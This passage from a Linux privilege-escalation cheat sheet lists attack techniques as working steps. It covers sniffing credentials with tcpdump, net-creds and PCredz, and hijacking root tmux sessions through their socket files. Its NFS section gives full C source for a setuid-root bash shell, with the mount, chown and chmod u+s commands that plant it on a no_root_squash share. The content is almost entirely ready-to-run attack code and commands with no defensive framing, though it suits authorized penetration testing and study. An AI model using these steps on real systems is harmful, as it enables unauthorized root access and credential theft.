 * Passive Traffic Capture:
	* If tcpdump is installed and users can capture network traffic then sensitive data can be extracted. Tools such as net-creds and PCredz can be used.
* Weak NFS Privileges:
	* If an NFS file share is created with `no_root_squash` option then it is possible to write files with same permissions as root user.
	* From attack machine, list shares on NFS: `showmount -e <ip>`
	* From target, check shares with `no_root_squash` option: `cat /etc/exports`
	* Create executable that will set uid to 0 and execute bash.
		```c
		#include <stdio.h>
		#include <sys/types.h>
		#include <unistd.h>
		int main(void)
		{
		  setuid(0); setgid(0); system("/bin/bash");
		}
		```
	* Compile binary: `gcc shell.c -o shell`
	* From attack machine:
		* `sudo mount -t nfs <ip>:/<share> /mnt`
		* `cp shell /mnt/shell`
		* `sudo chown root:root /mnt/shell`
		* `sudo chmod u+s /mnt/shell`
		* You can alternatively upload .c file to target and compile binary to the share file. From attack machine chown to root and setuid bit.
	* From target, invoke executable which will spawn a shell as root.
* Hijacking Tmux Sessions:
	* Find Tmux socket files that used by root:
		* `ps aux`
		* `tmux ls`
		* `sudo tmux list-sessions` 
	* Open a Tmux session and attached it to the Tmux socket found: `tmux -S <socket file> new -s <session name>`
	* Assuming the Tmux socket is running with root privileges: `tmux -S <socket file>`
